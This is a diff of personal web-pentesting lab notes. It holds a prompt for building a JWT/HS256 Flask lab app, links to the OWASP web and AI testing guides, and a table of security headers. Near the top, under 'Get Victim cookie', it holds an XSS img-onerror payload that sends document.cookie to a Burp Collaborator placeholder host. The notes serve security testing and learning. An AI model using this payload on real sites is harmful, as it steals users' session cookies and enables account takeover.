@@ -1,4 +1,6 @@
 Prompt for making the Lab
+create a basic flask based Web application  with UI which uses JWT token to authenticate and authorizes its users; it uses HS256 alg to sign JWTs, and also create a single endpoint which display username 
+
 
 Testing guide for WEB
 https://owasp.org/www-project-web-security-testing-guide/latest/3-The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies
@@ -6,9 +8,6 @@ https://owasp.org/www-project-web-security-testing-guide/latest/3-The_OWASP_Test
 Testing guide for LLM 
 https://github.com/OWASP/www-project-ai-testing-guide/tree/main/Document/content
 https://github.com/OWASP/www-project-ai-testing-guide/blob/main/Document/README.md 
-
-
-
 
 Get Victim cookie 
 <img src=x onerror="document.location='http://burpcollaboratorLink?c='+document.cookie;" />
@@ -109,6 +108,7 @@ To log blocked resources for debugging, you can add a reporting URL:
 | **Cross-Origin-Opener-Policy (COOP)**                | Isolates browsing contexts to prevent cross-origin attacks     | Possible cross-origin leaks                     | `Cross-Origin-Opener-Policy: same-origin`                                                |
 | **Cross-Origin-Embedder-Policy (COEP)**              | Prevents loading of cross-origin resources unless CORS-enabled | Data leaks from external resources              | `Cross-Origin-Embedder-Policy: require-corp`                                             |
 | **Cross-Origin-Resource-Policy (CORP)**              | Restricts who can load resources                               | May allow third-party scraping or theft         | `Cross-Origin-Resource-Policy: same-origin`                                              |
+
 
 
 
